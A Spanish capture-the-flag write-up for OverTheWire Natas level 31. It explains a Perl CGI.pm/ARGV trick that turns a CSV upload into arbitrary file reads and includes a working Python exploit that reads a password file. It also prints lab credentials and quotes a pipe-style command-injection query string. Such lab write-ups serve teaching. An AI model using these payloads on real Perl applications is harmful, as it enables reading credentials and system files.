# Natas Level31

## Descripción
> **Level Goal (natas31.natas.labs.overthewire.org):** Una app "CSV2HTML" en Perl que permite subir un archivo `.csv` y lo renderiza como tabla HTML. El código relevante:
> ```perl
> my $cgi = CGI->new;
> if ($cgi->upload('file')) {
>     my $file = $cgi->param('file');
>     ...
>     while (<$file>) { ... }
> }
> ```

## Solución
Es una combinación de dos particularidades de Perl/CGI.pm que dan como resultado una **lectura arbitraria de archivos (LFI)**:

1. **`$cgi->param('file')` en contexto escalar** (al asignarse a `my $file`) devuelve solo el **primer** valor asociado a esa clave. Si en la petición multipart enviamos el campo `file` **dos veces** — primero como un campo de formulario normal con el texto `"ARGV"`, y luego como el archivo real subido — `$file` termina siendo la cadena literal `"ARGV"` en vez del descriptor de archivo de la subida.
2. **`<$file>` con `$file` igual a la cadena `"ARGV"` es un caso especial en Perl**: el operador diamante `<ARGV>` lee, uno a uno, de los archivos cuyos nombres están listados en el array global `@ARGV`. Y `CGI.pm` tiene, por compatibilidad histórica con el viejo estilo "ISINDEX" de formularios, un comportamiento poco conocido: si la cadena de consulta (query string) de la URL **no contiene signos `=`** (son "palabras clave" separadas por espacios/`+`), CGI.pm las trocea en una **lista** de palabras y las copia en `@ARGV` — una entrada del array por cada palabra.

Uniendo ambas piezas: si mandamos como query string una sola "palabra clave" que sea una **ruta de archivo absoluta**, esa ruta se convierte en el único elemento de `@ARGV`, y `<ARGV>` la abre y la lee directamente — sin pasar por ningún filtro de la aplicación.

```python
import requests, io

auth = ("natas31", "aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z")
base_url = "http://natas31.natas.labs.overthewire.org/index.pl"

# la query string, al no tener "=", se trocea en @ARGV como una lista de "palabras"
url = base_url + "?/etc/natas_webpass/natas32"

data = {"file": "ARGV"}                                             # $file = "ARGV"
files = {"file": ("x.csv", io.StringIO("a,b\n1,2\n"), "text/csv")}  # subida real, necesaria para $cgi->upload('file')

r = requests.post(url, auth=auth, data=data, files=files)
print(r.text)
# <tr><th>Rc3837d6qd3KoW0R2IgKssMXRX06btgY</th></tr>
```

## Notas adicionales
- **Corrección importante tras verificar con más cuidado:** el intento inicial usó una query string de tres "palabras" separadas por `+` (`?cat+/etc/natas_webpass/natas32+|`), imitando la técnica de ejecución remota de comandos del nivel 29 (un elemento de `@ARGV` terminado en `|` que Perl trataría como una tubería de shell). Esa petición dio el resultado correcto, pero **por la razón equivocada**: CGI.pm convierte cada "palabra clave" separada por espacios/`+` en un **elemento distinto** de `@ARGV`, así que en realidad se generaban tres intentos de apertura de archivo independientes — `"cat"` (falla, no existe), `"/etc/natas_webpass/natas32"` (**éxito, como lectura de archivo normal**) y `"|"` (falla) — y el contenido devuelto era simplemente el de la ruta intermedia, sin que se ejecutara ningún comando. Al probar con una única palabra clave (solo la ruta, sin `cat` ni `|`) se obtiene exactamente el mismo resultado, confirmando que se trata de una **lectura arbitraria de archivos**, no de ejecución de código. Ver el writeup del [nivel 32](../level32/README.md), donde sí hace falta lograr ejecución real y aparece la técnica correcta para conseguirlo.
- El campo de archivo real (`files={"file": ...}`) sigue siendo necesario aunque no se use su contenido: `$cgi->upload('file')` (la condición del `if`) exige que exista de verdad una subida bajo ese nombre; sin ella, el bloque nunca se ejecuta.
- La salida aparece disfrazada como si fuera la **cabecera de una tabla CSV** (`<th>...</th>`), porque el código simplemente hace `split /,/` sobre cada línea leída y la trata como columnas.

## Referencias
- Reto original: http://natas31.natas.labs.overthewire.org/
- Apoyo: https://metacpan.org/pod/CGI (documentación de `CGI.pm`, comportamiento de `param()` en listas de "keywords" quando no hay `=` en la query string)
- Apoyo: https://perldoc.perl.org/perlopentut#Perl-Command-Line-Argument-Files (comportamiento del filehandle `ARGV`/`<>` en Perl)
